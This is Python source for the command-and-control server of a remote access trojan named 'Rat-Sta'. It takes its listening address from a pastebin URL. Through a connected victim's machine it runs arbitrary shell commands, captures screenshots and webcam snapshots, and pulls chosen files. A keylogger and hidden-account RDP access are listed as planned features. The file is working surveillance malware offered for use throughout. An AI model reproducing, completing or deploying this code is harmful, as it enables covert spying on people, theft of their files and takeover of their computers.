import socket                           #To create TCP sockets
import sys                              #To Use sys.exit() method
import time                             #To use time.sleep() and saving files depending on current time
import requests                         #To get url raw content
import signal                           #To override Ctrl+C signal


#-----A little Rat-Sta Design on terminal-----#
def server_logo():
    print("ooooooooo.         .o.       ooooooooooooo     .oooooo..o ooooooooooooo       .o.      ")
    time.sleep(0.1)
    print("`888   `Y88.      .888.      8'   888   `8    d8P'    `Y8 8'   888   `8      .888.     ")
    time.sleep(0.1)
    print(" 888   .d88'     .8'888.          888         Y88bo.           888          .8'888.    ")
    time.sleep(0.1)
    print(" 888ooo88P'     .8' `888.         888          `'Y8888o.       888         .8' `888.   ")
    time.sleep(0.1)
    print(" 888`88b.      .88ooo8888.        888              `'Y88b      888        .88ooo8888.  ")
    time.sleep(0.1)
    print(" 888  `88b.   .8'     `888.       888         oo     .d8P      888       .8'     `888. ")
    time.sleep(0.1)
    print(" o888o  o888o o88o     o8888      o888         88888888P'      888      o88o     o8888o\n \n \n")
    time.sleep(0.1)

#-----The Rat-Sta Helpmenu-----#
def helpmenu():
    print("\n \n \n \n                 !!:.Welcome to Rat-Sta .:!!\n \n")
    print("             input anything  : Sends your input as a command prompt to the client.\n")
    print("             screenshot      :       Takes screenshot from client PC.\n")
    print("             camera          :       Takes snapshot from client PC.\n")
    print("             download        :       Select a specific file from client to download it.\n")
    print("(Coming soon)keyogger        :       Save keyboard button-pressed.\n")
    print("(Coming soon)select client x :       Connect to the client x ()\n")
    print("(Coming soon)rdp             :       Create a new user account and connect to it with rdp protocol\n")
    print("(Coming soon)chat            :       Opens a Chat-Window between you annd the client\n")
    print("             quit            :       Quits Rat-Sta.\n \n \n \n")

#-----This function gets HOST and PORT from a raw-data URL -----#
def getHostPort(link):
    r = requests.get(link) # response will be stored from url
    content = r.text  # raw text from url
    content=content.split(' ')
    return content

#-----This function creates socket and gets HOST and PORT -----#
def socket_create():
    try:
        global host
        global port
        global s
        host = hostFromURL
        port = portFromURL
        #host='192.168.0.100'       #Uncomment this to put your local IP address manually
        #port=9999                  #Uncomment this to put your port number manually
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)    #Creating a TCP socket
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #For reusing the socket instantly after it will be useless
    except socket.error as msg:
        print("error creating the socket : " + str(msg))
        time.sleep(2)
        socket_create()

#-----This function binds HOST and PORT to the socket then makes the socket listen to client connection  -----#
def socket_bind():
    try:
        global host
        global port
        global s
        s.bind((host, port))
        s.listen(5)
        print("Server is Listening ...")
    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
        time.sleep(5)
        socket_bind()

#-----This function is accepting the connection from the client  -----#
def socket_accept():
    global s
    global conn
    conn,address=s.accept()   
    print("Connection has been established | " + "IP " + address[0] + " | Port " + str(address[1])) 
    send_commands(conn)
    conn.close()

#-----This function is used to all kind of commands to the client -----#
def send_commands(conn):
    global s
    while True:
        signal.signal(signal.SIGINT, catch_ctrl_C)   #Sends a message to client to reset the connection
        cmd = input("> ")
        if cmd == '':
            pass
        elif cmd == 'help':
            helpmenu()
        elif cmd == 'quit':
            conn.send(str.encode(cmd))
            quitting_RatSta(conn)
        elif cmd == 'download':
            conn.send(str.encode(cmd))
            receive_file(conn)
        elif cmd == 'screenshot':
            conn.send(str.encode(cmd))
            receive_screenshot(conn)
        elif cmd == 'camera':
            conn.send(str.encode(cmd))
            receive_camera(conn)
        elif len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(4096), "utf-8")
            client_response=client_response.replace("…","à")   #fixes some characters in the output
            client_response=client_response.replace("‚","é")   #depending on what language is used
            client_response=client_response.replace("Š","è")   #Us or Fr
            print(client_response, end="")

#-----This function is used to change the Ctrl+C Signal: when Ctrl+C is pressed, the script do some srtuff before it quits-----#
def catch_ctrl_C(sig,frame):
    global s
    global conn
    quitting_RatSta(conn)

#-----This function sends a 'quit' command to the client in order to let the client try to reconnect to the server next time-----#
def quitting_RatSta(conn):
    global s
    print("\n \n \n \nQUITTING RAT STA . . .\n \n \n \n")
    conn.send(str.encode("quit"))
    conn.close()
    s.close()
    sys.exit()

#-----Sending the screenshot command to the client-----#
def receive_screenshot(conn):
    if str(conn.recv(4096),"utf-8")=='captured':
        d=conn.recv(4096)
        date_now=time.strftime("%Y %m %d %H %M %S", time.gmtime())
        naame="screenshots/{}.png".format(date_now)
        f=open(naame,"wb")
        f.write(d)
        while not ('complete' in str(d)) :
            d=conn.recv(4096)
            f.write(d)
        f.close()
        print("Image downloaded succesfully in /screenshots")
    else:
        pass    

#-----Sending the Web-Cam command to the client-----#
def receive_camera(conn):
    if str(conn.recv(4096),"utf-8")=='captured':
        d=conn.recv(4096)
        date_now=time.strftime("%Y %m %d %H %M %S", time.gmtime())
        naame="camera/{}.jpg".format(date_now)
        f=open(naame,"wb")
        f.write(d)
        while not ('complete' in str(d)) :
            d=conn.recv(4096)
            f.write(d)
        f.close()
        print("WebCam capture downloaded succesfully in /camera")
    else:
        print("Something wrong while screenshoting!\n ")
        pass 

#-----Sending a file download command to the client-----#
def receive_file(conn):
    filename=input("   Select the file desired >>> ")
    conn.send(str.encode(filename))
    foldername="files/" + filename
    test=str(conn.recv(4096),"utf-8")
    if test=='captured':
        d=conn.recv(4096)
        f=open(foldername,"wb")
        f.write(d)
        while not ('complete' in str(d)) :
            d=conn.recv(4096)
            f.write(d)
        f.close()
        print("{} downloaded succesfully in /files".format(filename))
    else:
        print("You entered the file name incorrectly or the file does not exist in this directory ...")
        pass

#-----The MAIN Function -----#
def main():
    socket_create()
    socket_bind()
    socket_accept()

###########################################################################################################
server_logo()
url='https://pastebin.com/raw/xTBFbz6V' # Here u can put your URL that contains host and port server as raw data split by spacebar ('192.168.0.2 7777' for exemple)
hostFromURL=getHostPort(url)[0]
portFromURL=int(getHostPort(url)[1])

main()


